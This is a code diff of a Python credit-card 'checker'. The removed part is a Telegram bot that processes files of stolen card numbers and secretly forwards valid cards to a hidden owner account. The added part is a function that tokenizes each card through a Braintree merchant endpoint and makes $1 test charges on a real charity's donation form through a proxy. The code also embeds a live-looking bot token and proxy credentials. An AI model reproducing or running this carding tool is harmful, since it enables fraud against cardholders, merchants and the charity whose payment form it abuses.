@@ -1,150 +1,77 @@
-import requests
-import telebot,time
-from telebot import types
-from gatet import Tele
-import os
-token = '8181812070:AAE730BqIxuKpmikhYLKBawtSYZay5UaUts'
-bot=telebot.TeleBot(token,parse_mode="HTML")
-@bot.message_handler(commands=["start"])
-def start(message):
-	if not str(message.chat.id) == '7210226118':
-		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @strawhatchannel96")
-		return
-	bot.reply_to(message,"Send the file now")
-@bot.message_handler(content_types=["document"])
-def main(message):
-	if not str(message.chat.id) == '7210226118':
-		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @strawhatchannel96")
-		return
-	dd = 0
-	live = 0
-	ch = 0
-	ccn = 0
-	cvv = 0
-	lowfund = 0
-	ko = (bot.reply_to(message, "CHECKING....⌛").message_id)
-	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
-	with open("combo.txt", "wb") as w:
-		w.write(ee)
+import requests,re
+import random
+from proxy import reqproxy, make_request
+def Tele(ccx):
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
+
+	headers = {
+	    'authority': 'api.braintreegateway.com',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'script',
+	    'sec-fetch-mode': 'no-cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	response = session.get(
+	    f'https://api.braintreegateway.com/merchants/d3439ytwqgbfzqp8/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.31.0&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDc5MzA5NzIsImp0aSI6ImFhY2YyMDk1LTM1MTgtNDEzZS04OTQ5LWQ1YWI0YjZkNjM1MCIsInN1YiI6ImQzNDM5eXR3cWdiZnpxcDgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImQzNDM5eXR3cWdiZnpxcDgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.ISW_MtRF4GP60Q7iR5eS5bBV6xKtaroRgCdIJ8IYAF-ixKAZL8ejA7nTEmlmo-PnpXKR5LTWHMegMURSEfEySg&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=dc68f882-ca0b-478f-822b-f32de47cd9c3&share=false&&creditCard%5Bnumber%5D={n}&creditCard%5BexpirationMonth%5D={mm}&creditCard%5BexpirationYear%5D={yy}&creditCard%5Bcvv%5D=&_method=POST&callback=callback_json4ae10562cadf430da71e900a30020c24',
+	    headers=headers,
+	)
+	
+	nonce = re.search(r'"nonce":"(.*?)"', response.text).group(1)
+	#print(nonce)
+	
+	headers = {
+	    'authority': 'icmfoundation.org',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://icmfoundation.org',
+	    'referer': 'https://icmfoundation.org/donate/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = {
+	    'firstName': 'Rodam',
+	    'lastName': 'User',
+	    'amount': '1',
+	    'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	    'cvv': f'{cvc}',
+	    'payment_method_nonce': f'{nonce}',
+	}
+	
+	response = session.post('https://icmfoundation.org/braintree-process-payment', headers=headers, data=data)
+	
 	try:
-		with open("combo.txt", 'r') as file:
-			lino = file.readlines()
-			total = len(lino)
-			for cc in lino:
-				current_dir = os.getcwd()
-				for filename in os.listdir(current_dir):
-					if filename.endswith(".stop"):
-						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='STOP ✅\nBOT BY ➜ @strawhatchannel96')
-						os.remove('stop.stop')
-						return
-				try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
-				except: pass
-				try:
-					brand = data['brand']
-				except:
-					brand = 'Unknown'
-				try:
-					card_type = data['type']
-				except:
-					card_type = 'Unknown'
-				try:
-					country = data['country_name']
-					country_flag = data['country_flag']
-				except:
-					country = 'Unknown'
-					country_flag = 'Unknown'
-				try:
-					bank = data['bank']
-				except:
-					bank = 'Unknown'
-				
-				start_time = time.time()
-				try:
-					last = str(Tele(cc))
-				except Exception as e:
-					print(e)
-					last = 'missing payment form'
-				mes = types.InlineKeyboardMarkup(row_width=1)
-				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
-				status = types.InlineKeyboardButton(f"• STATUS ➜ {last} •", callback_data='u8')
-				cm3 = types.InlineKeyboardButton(f"• CHARGED ➜ [ {ch} ] •", callback_data='x')
-				cm4 = types.InlineKeyboardButton(f"• CCN ➜ [ {ccn} ] •", callback_data='x')
-				cm5 = types.InlineKeyboardButton(f"• CVV ➜ [ {cvv} ] •", callback_data='x')
-				cm6 = types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ {lowfund} ] •", callback_data='x')
-				cm7 = types.InlineKeyboardButton(f"• DECLINED ➜ [ {dd} ] •", callback_data='x')
-				cm8 = types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x')
-				stop=types.InlineKeyboardButton(f"[ STOP ]", callback_data='stop')
-				mes.add(cm1,status, cm3, cm4, cm5, cm6, cm7, cm8, stop)
-				end_time = time.time()
-				execution_time = end_time - start_time
-				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait For Processing   
-by ➜ @strawhatchannel96 ''', reply_markup=mes)
-				msg = f''' 
-𝐂𝐀𝐑𝐃: <code>{cc}</code>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment successful 🔥</code>
-
-𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
-𝐁𝐚𝐧𝐤: <code>{bank}</code>
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
-
-𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
-𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-
-#Hit_Sender
-				owner_id = 7805235233  #
-				
-				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
-
-				if "Approved" in last:
-				    with open("thank_cards.txt", "a") as thank_file:
-				        thank_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
-
-				elif "Not sufficient funds" in last:
-				    with open("insufficient_cards.txt", "a") as insufficient_file:
- 				       insufficient_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
-
-				else:
-				    with open("other_cards.txt", "a") as other_file:
- 				       other_file.write(card_info + "\n")
-#Hit_Sender
-				
-				print(last)
-				if 'Approved' in last:
-					ch += 1
-					bot.reply_to(message, msg)
-					
-				elif 'Your card does not support this type of purchase' in last:
-				    cvv += 1
-				    				    
-				elif 'security code is incorrect' in last or 'security code is invalid' in last:
-					ccn += 1
-					
-				elif 'Not sufficient funds' in last:
-					msg = f'''			
-𝐂𝐀𝐑𝐃: <code>{cc}</code>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>INSUFFICIENT FUNDS 🔥</code>
-
-𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
-𝐁𝐚𝐧𝐤: <code>{bank}</code>
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
-
-𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
-𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-					lowfund += 1
-					bot.reply_to(message, msg)
-					
-				elif 'Verifying strong customer authentication. Please wait...' in last:
-				    cvv += 1
-				    	
-				else:
-					dd += 1
-	except Exception as e:
-		print(e)
-	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED ✅\nBOT BY ➜ @strawhatchannel96')
-@bot.callback_query_handler(func=lambda call: call.data == 'stop')
-def menu_callback(call):
-	with open("stop.stop", "w") as file:
-		pass
-bot.polling()
+		result = re.search(r'<h4>(.*?)</h4>', response.text).group(1)
+	except:
+		result = re.search(r'<h2 id="h2_thanks">(.*?) </h2>', response.text).group(1)
+	
+	return (result)
